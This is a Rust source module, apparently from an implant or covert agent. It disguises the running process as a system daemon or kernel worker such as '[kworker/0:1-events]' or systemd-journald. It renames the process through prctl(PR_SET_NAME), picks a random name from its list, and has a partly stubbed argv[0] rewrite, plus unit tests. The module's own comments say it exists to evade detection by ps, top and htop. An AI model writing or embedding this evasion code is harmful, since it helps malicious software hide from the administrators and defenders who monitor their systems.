//! Process masquerading — make the agent look like a legitimate process.
//!
//! Rewrites argv[0], /proc/self/comm, and prctl(PR_SET_NAME) to mimic
//! common system daemons. This helps avoid detection by process listing
//! tools (ps, top, htop).

/// Common process names to masquerade as
pub const MASQUERADE_NAMES: &[&str] = &[
    "[kworker/0:1-events]",
    "[kworker/u8:2-flush]",
    "[migration/0]",
    "[rcu_preempt]",
    "[irq/44-mei_me]",
    "/usr/lib/systemd/systemd-journald",
    "/usr/lib/systemd/systemd-resolved",
    "/usr/sbin/cron",
    "/usr/sbin/thermald",
    "/usr/lib/accountsservice/accounts-daemon",
];

/// Rewrite the process name visible in `ps` and `/proc/self/comm`
pub fn set_process_name(name: &str) {
    #[cfg(target_os = "linux")]
    {
        // PR_SET_NAME (15) sets /proc/self/comm (max 15 chars + null)
        let c_name = std::ffi::CString::new(&name[..name.len().min(15)])
            .unwrap_or_else(|_| std::ffi::CString::new("worker").unwrap());
        unsafe {
            libc::prctl(15, c_name.as_ptr() as libc::c_ulong, 0, 0, 0);
        }
    }
    #[cfg(not(target_os = "linux"))]
    { let _ = name; }
}

/// Rewrite argv[0] to a fake process name.
///
/// This modifies the process's command line as visible in /proc/self/cmdline
/// and tools like `ps aux`.
///
/// Safety: This overwrites the original argv buffer. The fake name must not
/// exceed the original argv[0] length.
pub fn rewrite_argv0(fake_name: &str) {
    #[cfg(target_os = "linux")]
    {
        // Read /proc/self/cmdline to find argv[0] size
        if let Ok(cmdline) = std::fs::read("/proc/self/cmdline") {
            let argv0_len = cmdline.iter().position(|&b| b == 0).unwrap_or(cmdline.len());
            if argv0_len == 0 { return; }

            // Overwrite via /proc/self/mem would be more thorough,
            // but modifying the environment pointer is simpler
            let fake = fake_name.as_bytes();
            let write_len = fake.len().min(argv0_len);

            // Use prctl for the comm name (ps shows this)
            set_process_name(fake_name);

            // For full argv[0] rewrite, we need the actual argv pointer.
            // On Linux, /proc/self/cmdline is read-only, but we can use
            // prctl(PR_SET_MM, PR_SET_MM_ARG_START/END) on newer kernels.
            // For compatibility, just use PR_SET_NAME which covers `ps -e`.
            let _ = write_len;
        }
    }
    #[cfg(not(target_os = "linux"))]
    { let _ = fake_name; }
}

/// Pick a random masquerade name
pub fn random_masquerade() -> &'static str {
    use rand::Rng;
    let idx = rand::thread_rng().gen_range(0..MASQUERADE_NAMES.len());
    MASQUERADE_NAMES[idx]
}

/// Apply process masquerade with a random name
pub fn masquerade() {
    let name = random_masquerade();
    set_process_name(name);
    rewrite_argv0(name);
    log::debug!("masquerading as: {name}");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_masquerade_names_not_empty() {
        assert!(!MASQUERADE_NAMES.is_empty());
    }

    #[test]
    fn test_random_masquerade() {
        let name = random_masquerade();
        assert!(!name.is_empty());
        assert!(MASQUERADE_NAMES.contains(&name));
    }

    #[test]
    fn test_set_process_name_no_panic() {
        set_process_name("test-worker");
    }

    #[test]
    fn test_rewrite_argv0_no_panic() {
        rewrite_argv0("[kworker/0:1]");
    }

    #[test]
    fn test_masquerade_no_panic() {
        masquerade();
    }
}
